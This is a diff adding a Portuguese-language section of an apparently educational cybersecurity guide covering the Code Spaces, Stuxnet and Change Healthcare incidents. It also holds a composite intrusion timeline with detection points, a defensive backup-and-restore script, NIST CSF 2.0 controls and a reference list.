+      <h4><span class="tag case-tag">Caso</span> Code Spaces, 2014 — a empresa que não sobreviveu</h4>
+      <p>
+        Um caso curto e brutal sobre onde vive o verdadeiro ponto único de falha. Depois de começar um ataque
+        DDoS, uma pessoa não autorizada obteve acesso ao <strong>painel de controlo Amazon EC2</strong> da Code
+        Spaces e tentou extorquir. A Code Spaces relatou que, ao tentar recuperar o controlo mudando
+        palavras-passe, o atacante usou entradas de reserva já criadas para o painel AWS e apagou recursos na
+        nuvem — snapshots EBS, baldes S3, AMIs, instâncias e cópias. A empresa disse que não podia continuar a
+        operar e encerrou <a href="#ref-24-pt">[24]</a>.
+      </p>
+      <ul class="facts">
+        <li>A maioria dos repositórios e cópias dos clientes, e todas as máquinas virtuais, perderam-se; a Code Spaces concluiu que não tinha “<b>alternativa senão cessar a actividade</b>” <a href="#ref-24-pt">[24]</a>.</li>
+        <li>O relato da época <b>não estabelece como o atacante obteve primeiro o acesso à AWS</b> — por isso esta página também não o afirma <a href="#ref-24-pt">[24]</a>.</li>
+        <li>A lição: cópias guardadas no mesmo plano de controlo que os sistemas que protegem não são cópias. Um atacante que é dono da consola é dono da recuperação.</li>
+      </ul>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot g"></span><span class="fname">restore.sh — o único controlo que responde de facto ao ransomware</span><span class="lang">bash</span></div>
+<pre><code><span class="c">#!/usr/bin/env bash</span>
+<span class="k">set</span> -euo pipefail
+
+<span class="c"># 3-2-1-1-0: três cópias, dois suportes, uma fora, uma IMUTÁVEL,</span>
+<span class="c"># e ZERO restauros por verificar.</span>
+<span class="c"># O Object Lock em modo COMPLIANCE não pode ser encurtado nem apagado —</span>
+<span class="c"># nem por um administrador, e portanto nem pelo atacante que agora</span>
+<span class="c"># é administrador. É esse exactamente o objectivo.</span>
+aws s3api put-object-retention <span class="k">\</span>
+  --bucket acme-backups <span class="k">\</span>
+  --key <span class="s">"db/nightly-${STAMP}.dump.gz"</span> <span class="k">\</span>
+  --retention <span class="s">"Mode=COMPLIANCE,RetainUntilDate=${LOCK_UNTIL}"</span>
+
+<span class="c"># Uma cópia que não restaurou é uma esperança, não uma cópia.</span>
+<span class="c"># Prove-o a relógio, numa base de dados descartável, e registe o resultado.</span>
+pg_restore --clean --if-exists -d <span class="s">"$SCRATCH_DB"</span> <span class="s">"/restore/nightly-${STAMP}.dump"</span>
+psql <span class="s">"$SCRATCH_DB"</span> -c <span class="s">"SELECT count(*) FROM orders;"</span> &gt; /var/log/restore-proof.txt</code></pre>
+    </div>
+
+    <div class="defense">
+      <h4>O que o trava</h4>
+      <ul>
+        <li><b>Cópias imutáveis e offline</b> com retenção que um atacante com direitos de administrador de domínio não consiga alterar — e <b>restauros testados</b> com um tempo de recuperação definido.</li>
+        <li><b>Segmentação de rede para OT:</b> a informática de negócio e o controlo industrial não devem partilhar o mesmo destino, como o encerramento da Colonial demonstrou.</li>
+        <li><b>Matar o acesso adormecido.</b> A conta VPN da Colonial estava inactiva. Contas inactivas são passivo puro.</li>
+        <li><b>Controlos no processo de pagamento</b> — verificação fora de banda para alterações de dados bancários e aprovação dupla para transferências grandes.</li>
+        <li><b>Um plano de resposta a incidentes ensaiado</b>, incluindo jurídico, comunicação e notificação ao regulador, decidido antes do incidente e não durante.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="pt-l8">
+  <h2 class="big">Nível 8 · Operações de estado-nação</h2>
+
+  <div class="level" style="--c:#bc8cff">
+    <div class="level-head">
+      <span class="num">8</span>
+      <div>
+        <h3>Zero-days, cadeias de fornecimento e atravessar o air gap</h3>
+        <p class="tactic">MITRE ATT&amp;CK <b>T1195 Supply Chain Compromise</b> · <b>T1190</b> · Instrumental à medida com recursos de estado-nação</p>
+      </div>
+    </div>
+    <p>
+      No topo da escada as técnicas deixam de ser mercantilizadas e passam a ser feitas à medida: várias
+      vulnerabilidades não publicadas numa só operação, malware personalizado para um único alvo industrial e
+      paciência medida em anos. E, no entanto, a lição mais importante destes casos é que continuam a depender
+      de algo banal — uma compilação assinada, uma pen USB, uma má configuração — para chegar ao alvo.
+    </p>
+
+    <div class="case">
+      <h4><span class="tag case-tag">Caso</span> Stuxnet — chegar a uma rede que não tinha internet</h4>
+      <p>
+        O Stuxnet visava ambientes de engenharia <strong>Siemens SIMATIC WinCC / STEP 7</strong>. Num sistema
+        correspondente podia alterar a lógica que controla equipamento industrial; a sua carga relacionada com
+        centrífugas manipulava comandos de conversores de frequência — e portanto a velocidade dos motores —
+        tentando esconder as alterações dos operadores <a href="#ref-15-pt">[15]</a>.
+      </p>
+      <ul class="facts">
+        <li>CISA: “<b>As pen USB parecem ser o principal mecanismo de infecção</b>”, embora o Stuxnet também pudesse espalhar-se por partilhas de rede e bases de dados SQL <a href="#ref-15-pt">[15]</a>. O suporte amovível foi a ponte sobre o air gap.</li>
+        <li>A CISA descreve <b>quatro zero-days do Windows</b> mais uma falha do Windows já corrigida: <b>CVE-2010-2568</b> (tratamento de atalhos/LNK do Windows Shell, permitindo propagação por um LNK num suporte amovível), <b>CVE-2010-2729</b> (Print Spooler), <b>CVE-2010-2743</b> (disposição de teclado do kernel, escalada local) e <b>CVE-2010-2744</b> (classe de janela do kernel, escalada local). A falha já corrigida era <b>MS08-067 / CVE-2008-4250</b> <a href="#ref-15-pt">[15]</a>.</li>
+        <li>Mantenha os números separados: <b>CVE-2010-2772</b>, uma palavra-passe fixa no Siemens WinCC/PCS 7, <em>não</em> é uma das quatro zero-days do Windows <a href="#ref-15-pt">[15]</a>.</li>
+        <li>Sobre o impacto, seja preciso. O Institute for Science and International Security reportou que o Irão desactivou e substituiu cerca de <b>1 000 centrífugas IR-1</b> em Natanz no final de 2009 ou início de 2010 e considerou a cronologia e as sequências do Stuxnet consistentes com um efeito no funcionamento das centrífugas — mas também afirmou que o propósito exacto e o efeito global do Stuxnet continuam <b>difíceis de avaliar</b>. O número de ~1 000 não prova que o Stuxnet causou todas as substituições. O aviso da CISA de 2010 reportou que a Siemens conhecia infecções mas que, nos casos reportados, nenhuma tinha afectado adversamente os sistemas de automação <a href="#ref-15b-pt">[15b]</a><a href="#ref-15-pt">[15]</a>.</li>
+        <li>O ISIS sobre o caminho: “Como os sistemas de controlo de Natanz não estão ligados à internet, o Stuxnet teria de viajar num suporte amovível” <a href="#ref-15b-pt">[15b]</a>.</li>
+      </ul>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot r"></span><span class="fname">a *forma* do alvo, não o instrumental</span><span class="lang">text</span></div>
+<pre><code><span class="c">// Ilustrativo. Isto é o que uma carga de OT manipulou — um setpoint num</span>
+<span class="c">// programa de controlo industrial, não um servidor web.</span>
+
+<span class="c">// Um programa Siemens SIMATIC S7 (STEP 7 / WinCC), como um operador o veria:</span>
+FREQ_SETPOINT := <span class="n">1064</span>;   <span class="c">// saída comandada ao variador, escalada</span>
+
+<span class="c">// As cargas da era Stuxnet alteravam a velocidade do rotor que o variador era</span>
+<span class="c">// comandado a atingir, enquanto <span class="bad">reproduziam valores normais gravados para o HMI</span></span>
+<span class="c">// dos operadores — por isso a sala de controlo via uma instalação saudável</span>
+<span class="c">// enquanto o equipamento corria fora do envelope de projecto.</span>
+
+<span class="c">// A lição não são os números. É o ENGANO DA FRONTEIRA:</span>
+<span class="c">// se aquilo que reporta o seu estado de segurança pode ser enganado, não tem</span>
+<span class="c">// um estado de segurança — tem um ecrã.</span></code></pre>
+    </div>
+
+    <div class="case">
+      <h4><span class="tag case-tag">Contra-caso</span> Change Healthcare, 2024 — impacto de nível 8, causa de nível 2</h4>
+      <p>
+        Um anti-clímax útil. O presidente executivo da UnitedHealth disse ao Congresso que o ataque teve êxito
+        porque um sistema crítico <strong>não usava autenticação multifactor</strong>; a rota reportada foram
+        credenciais comprometidas usadas para aceder remotamente a um portal Citrix da Change Healthcare
+        <a href="#ref-20-pt">[20]</a>. A vulnerabilidade Citrix Bleed (CVE-2023-4966) é frequentemente associada
+        a este incidente em comentários, mas <strong>não está estabelecida como vector do ataque</strong> pelas
+        fontes aqui examinadas — usar o acesso remoto Citrix não é o mesmo que explorar o Citrix Bleed.
+      </p>
+      <ul class="facts">
+        <li>A UnitedHealth pagou <b>22 milhões de dólares em Bitcoin</b>, segundo o testemunho do presidente executivo <a href="#ref-20-pt">[20]</a>.</li>
+        <li>O número de indivíduos afectados identificado pelo Office for Civil Rights do HHS é de aproximadamente <b>192,7 milhões</b> <a href="#ref-20b-pt">[20b]</a> — uma estimativa inicial de cerca de um terço dos americanos dada na audição foi substituída por este número maior.</li>
+        <li>A intrusão perturbou pagamentos e serviços de saúde em todo o país. A falha de controlo documentada, mais uma vez, foi <b>a falta de MFA</b> — não um zero-day.</li>
+      </ul>
+    </div>
+
+    <details class="deep">
+      <summary>“Air gap” não é uma fronteira de segurança</summary>
+      <div class="body">
+        <p>
+          Um air gap remove um caminho, não o conceito de ataque. Suportes amovíveis, portáteis de manutenção,
+          actualizações de software fornecidas pelo fabricante, periféricos sem fios e firmware de cadeia de
+          fornecimento atravessam fronteiras de isolamento na operação normal. Se um sistema está realmente
+          isolado, as perguntas honestas são: o que entra nele fisicamente, quem o transporta, e como sabemos
+          que esse portador está limpo? São controlos de processo, e falham como os controlos de processo
+          falham — porque alguém estava com pressa. Trate o isolamento como uma redução de probabilidade com um
+          risco residual documentado, não como um axioma de segurança.
+        </p>
+      </div>
+    </details>
+
+    <div class="defense">
+      <h4>O que o trava</h4>
+      <ul>
+        <li><b>Defesas próprias de OT:</b> gateways unidireccionais, monitorização de rede dentro da rede de controlo e suportes amovíveis estritamente controlados com quiosques de análise.</li>
+        <li><b>Integridade de fornecedor e de compilação:</b> verificar a proveniência da cadeia de fornecimento, fixar e atestar artefactos, e isolar a infraestrutura de compilação.</li>
+        <li><b>Detectar o exótico com o fundamental.</b> O SUNBURST foi descoberto ao notar actividade de saída invulgar, não por antivírus <a href="#ref-14-pt">[14]</a>.</li>
+        <li><b>Ensaiar o cenário do fim do mundo.</b> As organizações que responderam bem a intrusões de estado-nação já as tinham planeado.</li>
+        <li><b>Voltar ao básico, de propósito.</b> Como a Change Healthcare mostra, a ameaça cara chega muitas vezes pela porta mais barata — por isso o MFA em cada caminho de acesso remoto continua a ser o controlo de maior rendimento desta página.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="pt-anatomy">
+  <h2 class="big">Anatomia de uma campanha <span class="kicker">Compósita</span></h2>
+  <p class="deck">
+    Cada nível acima é real, mas as intrusões chegam como uma cadeia. Abaixo está um percurso compósito
+    construído a partir da mecânica documentada nestes casos — uma sequência realista, com os pontos de
+    detecção que um defensor poderia ter usado em cada passo.
+  </p>
+  <ul class="timeline">
+    <li style="--c:#8d9aab">
+      <span class="when">Dia 0 — nível 0</span>
+      <span class="what">O parque é mapeado a partir de fontes públicas</span>
+      <span class="how">Subdomínios, registos de certificados, anúncios de emprego que nomeiam produtos e um servidor de pré-produção esquecido ainda alcançável pela internet. Nada é quebrado; tudo é medido.</span>
+    </li>
+    <li style="--c:#58a6ff">
+      <span class="when">Dia 9 — nível 2</span>
+      <span class="what">Uma palavra-passe válida chega de um registo de infostealer</span>
+      <span class="how">O portátil pessoal de um prestador foi infectado meses antes. As credenciais colhidas dessa máquina incluíam uma ainda válida aqui — o padrão Snowflake <a href="#ref-37-pt">[37]</a>.</span>
+    </li>
+    <li style="--c:#bc8cff">
+      <span class="when">Dia 9 — nível 3</span>
+      <span class="what">O MFA é satisfeito, não derrotado</span>
+      <span class="how">Os pedidos push são disparados repetidamente até a vítima aprovar um para pararem. A correspondência de números teria quebrado isto; uma chave FIDO2 tê-lo-ia tornado impossível <a href="#ref-16-pt">[16]</a>.</span>
+    </li>
+    <li style="--c:#e3b341">
+      <span class="when">Dias 10–24 — nível 5</span>
+      <span class="what">Escalada silenciosa e movimento lateral</span>
+      <span class="how">O ponto de apoio é uma estação. As credenciais são colhidas da memória e de ficheiros de configuração, e as entradas passam de servidor para servidor com essas credenciais — e é por isso que a evidência nos registos parece administração, não intrusão <a href="#ref-46-pt">[46]</a><a href="#ref-47-pt">[47]</a>.</span>
+    </li>
+    <li style="--c:#39d353">
+      <span class="when">Dias 12–40 — nível 6</span>
+      <span class="what">Um batimento, e uma exfiltração lenta</span>
+      <span class="how">Uma máquina contacta um endereço a um ritmo de máquina. Os dados saem em blocos modestos e banais. Essa regularidade é o sinal mais forte ao alcance do defensor.</span>
+    </li>
+    <li style="--c:#f85149">
+      <span class="when">Dia 41 — nível 7</span>
+      <span class="what">As cópias são encontradas e destruídas, começa a extorsão</span>
+      <span class="how">É aqui que cópias imutáveis e testadas deixam de ser uma linha de política e passam a ser a diferença entre uma paragem e um evento existencial <a href="#ref-3-pt">[3]</a>.</span>
+    </li>
+  </ul>
+  <div class="callout danger">
+    <p><b>Repare onde estavam as falhas.</b> Nem um passo desta cadeia exigiu um zero-day. As violações
+    deste guia que envolveram capacidade exótica — Stuxnet, SolarWinds — eram <em>operações de
+    estado-nação</em>. Todos os casos com motivação criminal comum ou hacktivista foram ganhos com uma
+    palavra-passe reutilizada, um pedido aprovado por cansaço, um serviço sem correcção ou um sistema sem
+    segundo factor.</p>
+  </div>
+</section>
+
+<section id="pt-defense">
+  <h2 class="big">Defesas que aguentam de facto</h2>
+  <p class="deck">
+    Lendo os oito níveis, aparece um padrão: os controlos que terminam incidentes cedo não têm glamor, e quase
+    todos são gestão de identidade e de exposição. O Cybersecurity Framework 2.0 do NIST, publicado em
+    <strong>26 de Fevereiro de 2024</strong>, é uma boa forma de os organizar. As suas seis funções são
+    <strong>Governar, Identificar, Proteger, Detectar, Responder e Recuperar</strong> — sendo
+    <em>Governar</em> a novidade da versão 2.0 — e o quadro foi alargado da infraestrutura crítica para todas
+    as organizações <a href="#ref-5-pt">[5]</a><a href="#ref-6-pt">[6]</a>.
+  </p>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>Função</th><th>Os controlos que mapeiam para os casos acima</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><b>Governar</b></td>
+          <td>Propriedade nomeada do risco; um SLA de correcções com dentes; risco de terceiros tratado como seu (Target <a href="#ref-21-pt">[21]</a>); exigências de cadeia de fornecimento para fornecedores (SolarWinds <a href="#ref-12-pt">[12]</a>).</td>
+        </tr>
+        <tr>
+          <td><b>Identificar</b></td>
+          <td>Um inventário de cada activo virado para a internet e de cada dependência de software (Log4Shell <a href="#ref-31-pt">[31]</a>); um registo de contas privilegiadas e adormecidas — a conta VPN da Colonial estava inactiva <a href="#ref-11b-pt">[11b]</a>.</td>
+        </tr>
+        <tr>
+          <td><b>Proteger</b></td>
+          <td>MFA resistente a phishing em todos os caminhos, incluindo acesso remoto (Change Healthcare <a href="#ref-20-pt">[20]</a>); menor privilégio e administração em camadas; nenhum segredo de longa duração (Uber <a href="#ref-25-pt">[25]</a>); segmentação de rede, sobretudo em torno de pagamentos e sistemas OT.</td>
+        </tr>
+        <tr>
+          <td><b>Detectar</b></td>
+          <td>Registo de autenticação que é realmente vigiado (nível 1); visibilidade de saída e DNS para beaconing (nível 6); linhas de base de entradas privilegiadas para movimento lateral (nível 5); monitorização de integridade nos pipelines de compilação.</td>
+        </tr>
+        <tr>
+          <td><b>Responder</b></td>
+          <td>Um plano ensaiado com passos jurídicos, de comunicação e de reguladores acordados de antemão; um quadro de decisão sobre resgate que assume dupla extorsão (nível 7).</td>
+        </tr>
+        <tr>
+          <td><b>Recuperar</b></td>
+          <td>Cópias imutáveis e offline; restauros <b>testados</b> com um tempo de recuperação definido; compreender que processos são manuais e que processos simplesmente param.</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Os seis controlos que teriam terminado a maior parte deste guia</h3>
+  <div class="defense">
+    <h4>Maior rendimento por unidade de esforço</h4>
+    <ul>
+      <li><b>MFA resistente a phishing</b> (FIDO2/WebAuthn) em acesso remoto, consolas de administração, alojamento de código e nuvem. A correspondência de números como passo interino. Só isto quebra os níveis 2 e 3 <a href="#ref-16-pt">[16]</a><a href="#ref-17-pt">[17]</a>.</li>
+      <li><b>Eliminar privilégios adormecidos e permanentes.</b> Matar contas inactivas, remover direitos de administrador permanentes, rodar credenciais de longa duração e limitar as contas de serviço.</li>
+      <li><b>SLAs de correcção curtos para sistemas virados para a internet</b>, apoiados por inventário real e uma SBOM para saber o que corre quando o próximo Log4Shell chegar.</li>
+      <li><b>Cópias imutáveis, offline e testadas.</b> Não configuradas — restauradas, a relógio, num ambiente descartável, com o resultado registado.</li>
+      <li><b>Escrever software que falha em segurança.</b> Consultas parametrizadas, nada de interpolação de shell com entrada do utilizador, desserialização segura, valores por omissão seguros e segredos que nunca são de longa duração. A orientação Secure by Design da CISA enquadra isto como retirar o ónus ao cliente <a href="#ref-7-pt">[7]</a>.</li>
+      <li><b>Registar e olhar.</b> Quase todos os casos aqui deixaram evidência. A detecção raramente falhou por falta de dados; falhou por falta de atenção a dados que já existiam.</li>
+    </ul>
+  </div>
+
+  <div class="callout warn">
+    <p><b>Uma nota sobre ler números de violações.</b> As manchetes descrevem coisas diferentes. Os 6,9
+    milhões da 23andMe eram <em>perfis alcançáveis através de</em> cerca de 14 mil contas comprometidas, não
+    6,9 milhões de entradas <a href="#ref-43-pt">[43]</a>. A comunicação da AT&amp;T diz “quase todos os
+    clientes sem fios” e não dá total; o valor de ~109 milhões é uma contagem reportada de contas, não de
+    registos de chamadas <a href="#ref-38-pt">[38]</a><a href="#ref-39-pt">[39]</a>. Os 575–700 milhões da
+    Equifax foram um acordo, não a perda total <a href="#ref-9-pt">[9]</a>. A precisão importa, porque números
+    imprecisos produzem decisões de risco imprecisas.</p>
+  </div>
+</section>
+<section id="pt-refs">
+  <h2 class="big">Fontes e referências</h2>
+  <p class="deck">
+    Cada número e afirmação técnica acima é rastreável às fontes abaixo. Onde um detalhe é reportado em
+    vez de oficialmente estabelecido, o texto di-lo. Os valores são citados à fonte que os indica, não ao
+    resumo de um resumo.
+  </p>
+
+  <h3 class="refhead">Quadros e normas</h3>
+  <ol class="refs">
+    <li data-n="1" id="ref-1-pt">
+      <b>MITRE ATT&amp;CK</b> — a base de conhecimento de tácticas e técnicas adversárias usada em toda esta página. Site canónico, actualmente a identificar a v20.0 (13 de Outubro de 2026).
+      <span class="src"><a href="https://attack.mitre.org/" target="_blank" rel="noopener noreferrer" class="external">attack.mitre.org</a></span>
+      <span class="why">Usado para: o vocabulário de táctica/técnica e as contagens Enterprise de 15 tácticas, 227 técnicas e 479 sub-técnicas.</span>
+    </li>
+    <li data-n="2" id="ref-2-pt">
+      <b>MITRE ATT&amp;CK — versões e histórico de actualizações</b>
+      <span class="src"><a href="https://attack.mitre.org/resources/versions/" target="_blank" rel="noopener noreferrer" class="external">attack.mitre.org/resources/versions/</a> · <a href="https://attack.mitre.org/resources/updates/" target="_blank" rel="noopener noreferrer" class="external">attack.mitre.org/resources/updates/</a></span>
+      <span class="why">Usado para: a versão actual e as contagens de técnicas por domínio.</span>
+    </li>
+    <li data-n="5" id="ref-5-pt">
+      <b>NIST Cybersecurity Framework (CSF) 2.0</b> — publicado em 26 de Fevereiro de 2024; alargado a todas as organizações; acrescenta a função <em>Governar</em>.
+      <span class="src"><a href="https://www.nist.gov/cyberframework" target="_blank" rel="noopener noreferrer" class="external">nist.gov/cyberframework</a> · <a href="https://www.nist.gov/news-events/news/2024/02/nist-releases-version-20-landmark-cybersecurity-framework" target="_blank" rel="noopener noreferrer" class="external">anúncio de lançamento do NIST</a> · <a href="https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.29.pdf" target="_blank" rel="noopener noreferrer" class="external">CSF 2.0 (PDF)</a></span>
+      <span class="why">Usado para: as seis funções — Governar, Identificar, Proteger, Detectar, Responder, Recuperar.</span>
+    </li>
+    <li data-n="6" id="ref-6-pt">
+      <b>Registo de publicação do NIST CSF 2.0</b>
+      <span class="src"><a href="https://www.nist.gov/publications/nist-cybersecurity-framework-csf-20" target="_blank" rel="noopener noreferrer" class="external">nist.gov/publications/nist-cybersecurity-framework-csf-20</a></span>
+      <span class="why">Usado para: data de publicação e âmbito.</span>
+    </li>
+    <li data-n="7" id="ref-7-pt">
+      <b>CISA — Secure by Design</b> — orientação sobre a responsabilidade dos fabricantes.
+      <span class="src"><a href="https://www.cisa.gov/securebydesign" target="_blank" rel="noopener noreferrer" class="external">cisa.gov/securebydesign</a></span>
+      <span class="why">Usado para: expectativas de software seguro por omissão na secção de defesas.</span>
+    </li>
+    <li data-n="16" id="ref-16-pt">
+      <b>CISA — orientação sobre MFA resistente a phishing e correspondência de números</b> (31 de Outubro de 2022).
+      <span class="src"><a href="https://www.cisa.gov/news-events/alerts/2022/10/31/cisa-releases-guidance-phishing-resistant-and-numbers-matching-multifactor-authentication" target="_blank" rel="noopener noreferrer" class="external">alerta da CISA, 31 Out 2022</a> · <a href="https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf" target="_blank" rel="noopener noreferrer" class="external">folha informativa sobre MFA resistente a phishing (PDF)</a></span>
+      <span class="why">Usado para: a correspondência de números como medida interina; a afirmação explícita da CISA de que é mais fraca do que MFA resistente a phishing.</span>
+    </li>
+    <li data-n="17" id="ref-17-pt">
+      <b>CISA — visão geral do MFA</b> — identifica o FIDO/WebAuthn como a única autenticação amplamente disponível resistente a phishing.
+      <span class="src"><a href="https://www.cisa.gov/MFA" target="_blank" rel="noopener noreferrer" class="external">cisa.gov/MFA</a></span>
+      <span class="why">Usado para: porque o FIDO2/WebAuthn é o factor recomendado.</span>
+    </li>
+    <li data-n="36" id="ref-36-pt">
+      <b>MITRE ATT&amp;CK — T1110.004 Credential Stuffing</b>
+      <span class="src"><a href="https://attack.mitre.org/techniques/T1110/004/" target="_blank" rel="noopener noreferrer" class="external">attack.mitre.org/techniques/T1110/004/</a></span>
+      <span class="why">Usado para: a definição de credential stuffing e “sobreposição de credenciais”.</span>
+    </li>
+    <li data-n="46" id="ref-46-pt">
+      <b>MITRE ATT&amp;CK — T1550.002 Pass the Hash</b> (Movimento Lateral)
+      <span class="src"><a href="https://attack.mitre.org/techniques/T1550/002/" target="_blank" rel="noopener noreferrer" class="external">attack.mitre.org/techniques/T1550/002/</a></span>
+      <span class="why">Usado para: autenticar com um hash roubado em vez da palavra-passe em texto simples.</span>
+    </li>
+    <li data-n="47" id="ref-47-pt">
+      <b>MITRE ATT&amp;CK — TA0008 Lateral Movement</b>
+      <span class="src"><a href="https://attack.mitre.org/tactics/TA0008/" target="_blank" rel="noopener noreferrer" class="external">attack.mitre.org/tactics/TA0008/</a></span>
+      <span class="why">Usado para: a definição de movimento lateral e porque as ferramentas nativas são mais discretas.</span>
+    </li>
+    <li data-n="11" id="ref-11-pt">
+      <b>MITRE ATT&amp;CK — T1003 OS Credential Dumping</b>
+      <span class="src"><a href="https://attack.mitre.org/techniques/T1003/" target="_blank" rel="noopener noreferrer" class="external">attack.mitre.org/techniques/T1003/</a></span>
+      <span class="why">Usado para: a fase de acesso a credenciais na cadeia de escalada.</span>
+    </li>
+    <li data-n="48" id="ref-48-pt">
+      <b>MITRE ATT&amp;CK — T1071 Application Layer Protocol</b>
+      <span class="src"><a href="https://attack.mitre.org/techniques/T1071/" target="_blank" rel="noopener noreferrer" class="external">attack.mitre.org/techniques/T1071/</a></span>
+      <span class="why">Usado para: comandos e resultados embutidos no tráfego de camada de aplicação.</span>
+    </li>
+    <li data-n="49" id="ref-49-pt">
+      <b>MITRE ATT&amp;CK — T1219 Remote Access Software</b>
+      <span class="src"><a href="https://attack.mitre.org/techniques/T1219/" target="_blank" rel="noopener noreferrer" class="external">attack.mitre.org/techniques/T1219/</a></span>
+      <span class="why">Usado para: o padrão de ligação inversa / back-connect.</span>
+    </li>
+    <li data-n="50" id="ref-50-pt">
+      <b>ExtraHop — o beaconing de C2 explicado</b> (visão geral em linguagem simples)
+      <span class="src"><a href="https://www.extrahop.com/resources/attacks/c-c-beaconing" target="_blank" rel="noopener noreferrer" class="external">extrahop.com/resources/attacks/c-c-beaconing</a></span>
+      <span class="why">Usado para: uma explicação ao nível do fornecedor sobre contactos periódicos, referida como comentário e não como autoridade.</span>
+    </li>
+  </ol>
+
+  <h3 class="refhead">Estatísticas</h3>
+  <ol class="refs">
+    <li data-n="3" id="ref-3-pt">
+      <b>Verizon Data Breach Investigations Report 2025</b> — publicado em 23 de Abril de 2025. Valores usados: ~60% das violações envolveram um elemento humano; ransomware presente em 44% das violações (+37% face ao ano anterior); exploração de vulnerabilidades como vector inicial em 20% (+34%); envolvimento de terceiros em 30%, o dobro dos 15% anteriores; pagamento mediano de resgate 115 mil dólares (abaixo dos 150 mil); 64% das organizações vítimas não pagaram.
+      <span class="src"><a href="https://www.verizon.com/about/news/2025-data-breach-investigations-report" target="_blank" rel="noopener noreferrer" class="external">comunicado da Verizon</a> · <a href="https://www.verizon.com/business/resources/reports/2025-dbir-data-breach-investigations-report.pdf" target="_blank" rel="noopener noreferrer" class="external">DBIR 2025 (PDF)</a></span>
+      <span class="why">Ressalva: “envolveu um elemento humano” não é o mesmo que “causado por erro humano”.</span>
+    </li>
+    <li data-n="4" id="ref-4-pt">
+      <b>Verizon Data Breach Investigations Report 2024</b> — publicado em 1 de Maio de 2024. Valores usados: 68% das violações envolveram um elemento humano não malicioso; ransomware e outras extorsões em 32% das violações; exploração de vulnerabilidades como ponto de entrada inicial em 14%, +180% face ao ano anterior; envolvimento de terceiros em 15%.
+      <span class="src"><a href="https://www.verizon.com/about/news/2024-data-breach-investigations-report-vulnerability-exploitation-boom" target="_blank" rel="noopener noreferrer" class="external">comunicado da Verizon</a> · <a href="https://www.verizon.com/business/resources/reports/2024-dbir-data-breach-investigations-report.pdf" target="_blank" rel="noopener noreferrer" class="external">DBIR 2024 (PDF)</a></span>
+      <span class="why">Ressalva: os conjuntos de dados do DBIR descrevem violações reportadas, não necessariamente as ocorridas no ano de publicação.</span>
+    </li>
+  </ol>
+
+  <h3 class="refhead">Casos</h3>
+  <ol class="refs">
+    <li data-n="8" id="ref-8-pt">
+      <b>Equifax — declaração sobre o incidente</b> (acesso inicial)
+      <span class="src"><a href="https://investor.equifax.com/news-events/press-releases/detail/237/equifax-releases-details-on-cybersecurity-incident" target="_blank" rel="noopener noreferrer" class="external">investor.equifax.com</a></span>
+      <span class="why">Citado: “O vector de ataque usado neste incidente ocorreu através de uma vulnerabilidade no Apache Struts (CVE-2017-5638)”; “143 milhões de consumidores dos EUA”.</span>
+    </li>
+    <li data-n="9" id="ref-9-pt">
+      <b>Comissão Federal de Comércio dos EUA — acordo com a Equifax</b>
+      <span class="src"><a href="https://www.ftc.gov/news-events/news/press-releases/2019/07/equifax-pay-575-million-part-settlement-ftc-cfpb-states-related-2017-data-breach" target="_blank" rel="noopener noreferrer" class="external">comunicado da FTC, Julho de 2019</a></span>
+      <span class="why">Citado: “pelo menos 575 milhões de dólares, e potencialmente até 700 milhões”; “aproximadamente 147 milhões de pessoas”; 145,5 milhões de números de segurança social e 209 mil números de cartões.</span>
+    </li>
+    <li data-n="10" id="ref-10-pt">
+      <b>GAO — registo do relatório sobre a Equifax</b>
+      <span class="src"><a href="https://www.gao.gov/products/gao-18-559" target="_blank" rel="noopener noreferrer" class="external">gao.gov/products/gao-18-559</a></span>
+      <span class="why">Referido para o contexto de monitorização/visibilidade. A discussão do certificado não pôde ser citada a partir do PDF durante a investigação, por isso é caracterizada com cautela.</span>
+    </li>
+    <li data-n="21" id="ref-21-pt">
+      <b>KrebsOnSecurity — entrada na Target pelo prestador de AVAC</b>
+      <span class="src"><a href="https://krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company/" target="_blank" rel="noopener noreferrer" class="external">krebsonsecurity.com</a></span>
+      <span class="why">Citado: os atacantes “entraram na rede da retalhista a 15 de Novembro de 2013 usando credenciais de rede roubadas à Fazio Mechanical Services”; ~40 milhões de contas de cartões de débito e crédito.</span>
+    </li>
+    <li data-n="22" id="ref-22-pt">
+      <b>Senado dos EUA — “A ‘Kill Chain’ Analysis of the 2013 Target Data Breach” (PDF)</b>
+      <span class="src"><a href="https://www.commerce.senate.gov/wp-content/uploads/media/doc/2014%200325%20Target%20Kill%20Chain%20Analysis.pdf" target="_blank" rel="noopener noreferrer" class="external">commerce.senate.gov (PDF)</a></span>
+      <span class="why">Referência de fonte primária para a cadeia da violação. O texto do PDF não era extraível durante a investigação, por isso não se oferece citação directa.</span>
+    </li>
+    <li data-n="23" id="ref-23-pt">
+      <b>Target Corporation — Form 10-K (exercício de 2014), SEC dos EUA</b>
+      <span class="src"><a href="https://www.sec.gov/Archives/edgar/data/27419/000002741915000012/tgt-20150131x10k.htm" target="_blank" rel="noopener noreferrer" class="external">comunicação à SEC</a></span>
+      <span class="why">Citado para o impacto financeiro reportado (252 M$ de despesas, 90 M$ de seguro, 162 M$ líquidos). O corpo da comunicação não pôde ser obtido durante a investigação, por isso os valores são atribuídos à comunicação em vez de citados dela.</span>
+    </li>
+    <li data-n="11b" id="ref-11b-pt">
+      <b>Government Publishing Office dos EUA — registo de audição da Câmara sobre o ataque à Colonial Pipeline</b>
+      <span class="src"><a href="https://www.govinfo.gov/content/pkg/CHRG-117hhrg45085/html/CHRG-117hhrg45085.htm" target="_blank" rel="noopener noreferrer" class="external">govinfo.gov</a></span>
+      <span class="why">Citado: “os hackers exploraram uma conta VPN desprotegida que já não estava em uso”; pipeline encerrado por “quase uma semana”.</span>
+    </li>
+    <li data-n="11c" id="ref-11c-pt">
+      <b>Departamento de Justiça dos EUA — apreensão das receitas de resgate do DarkSide</b>
